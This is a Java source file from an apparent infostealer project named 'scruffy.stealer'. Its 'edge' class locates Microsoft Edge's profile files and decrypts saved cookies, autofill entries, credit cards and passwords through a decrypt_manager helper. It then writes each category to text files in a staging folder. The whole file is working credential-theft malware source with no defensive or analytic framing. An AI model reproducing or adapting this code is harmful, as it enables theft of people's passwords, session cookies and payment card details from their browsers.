package scruffy.stealer.impl.browser;

import java.io.File;
import java.util.Arrays;
import java.util.List;

import org.apache.commons.io.FileUtils;

import scruffy.stealer.impl.coin.wallet;
import scruffy.stealer.utils.utilities;
import scruffy.stealer.utils.decrypt.decrypt_manager;

public class edge extends utilities {

    private static List<String> names = Arrays.asList("cookie", "autofill", "creditcard", "password");

    private static String
		lStatePath = System.getenv("localappdata") + "/Microsoft/Edge/User Data/Local State",
		cookiePath = System.getenv("localappdata") + "/Microsoft/Edge/User Data/Default/Network/Cookies",
		webdataPath = System.getenv("localappdata") + "/Microsoft/Edge/User Data/Default/Web Data",
		loginDataPath = System.getenv("localappdata") + "/Microsoft/Edge/User Data/Default/Login Data";
	
    public void initialize() throws Exception {
    	setup("browser/edge/default/");
    }

    private void setup(String path) throws Exception {
        names.forEach(name -> {
            String decryptedContent = "";
            switch (name) {
                case "cookie": {
                    decryptedContent = new decrypt_manager().getCookies(cookiePath, lStatePath);
                    break;
                }
                case "autofill": {
                    decryptedContent = new decrypt_manager().getAutofills(webdataPath);
                    break;
                }
                case "creditcard": {
                    decryptedContent = new decrypt_manager().getCards(webdataPath, lStatePath);
                    break;
                }
                case "password": {
                    decryptedContent = new decrypt_manager().getPasswords(loginDataPath, lStatePath);
                    break;
                }
            }
            if (!decryptedContent.isEmpty()) {
                assert !wallet.path.containsKey("edge");
                wallet.path.put("edge", System.getenv("localappdata") + "/Microsoft/Edge/User Data/Default");
                
                try {
                    FileUtils.writeStringToFile(new File(getFolder() + "/" + path + name + ".txt"), decryptedContent, "utf-8", true);
                } catch (Exception ignore) {}
            }
        });
    }

}